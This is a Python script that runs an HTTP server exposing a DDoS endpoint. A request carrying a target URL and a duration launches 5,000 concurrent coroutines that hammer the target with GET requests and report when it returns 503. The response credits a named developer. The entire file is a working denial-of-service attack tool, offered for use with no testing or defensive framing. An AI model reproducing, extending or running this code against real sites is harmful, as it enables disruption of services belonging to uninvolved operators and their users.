import aiohttp
import asyncio
import os
import threading
from http.server import SimpleHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import time
import json

TARGET_URL = ""
ATTACK_DURATION = 60

os.system('cls' if os.name == 'nt' else 'clear')

total_requests = 1000000
requests_per_second = 5000 

async def attack(target_url, duration):
    start_time = time.time()
    try:
        async with aiohttp.ClientSession() as session:
            while True:
                if time.time() - start_time > duration:
                    break
                async with session.get(target_url) as response:
                    if response.status == 503:
                        print("Server down.")
                    elif response.status == 200:
                        print("Website still up.")
                    else:
                        print(f"Unexpected status code: {response.status}")
    except aiohttp.ClientError as e:
        print(f"Client error: {e}")
    except asyncio.TimeoutError:
        print("Request timed out")
    except Exception as e:
        print(f"Unexpected error: {e}")

async def main(target_url, duration):
    await asyncio.gather(*[attack(target_url, duration) for _ in range(requests_per_second)])

class DdosHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        global TARGET_URL
        parsed_url = urlparse(self.path)
        query_params = parse_qs(parsed_url.query)
        target_url = query_params.get('url', [None])[0]
        duration = int(query_params.get('time', [60])[0])

        if target_url:
            try:
                asyncio.run(main(target_url, duration))
                response_data = {
                    "success": {
                        "time": duration,
                        "url": target_url,
                        "developer": "Jonell Magallanes"
                    }
                }
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(response_data).encode('utf-8'))
            except Exception as e:
                error_data = {
                    "error": f"An error occurred: {str(e)}"
                }
                self.send_response(500)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(error_data).encode('utf-8'))
        else:
            error_data = {
                "error": "Bad request. Please provide a valid 'url' parameter."
            }
            self.send_response(400)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(error_data).encode('utf-8'))

def run_http_server(port=8000):
    with HTTPServer(('', port), DdosHandler) as server:
        print(f"Serving HTTP on port {port}...")
        server.serve_forever()

if __name__ == "__main__":
    server_thread = threading.Thread(target=run_http_server, args=(8000,))
    server_thread.daemon = True
    server_thread.start()

    server_thread.join()
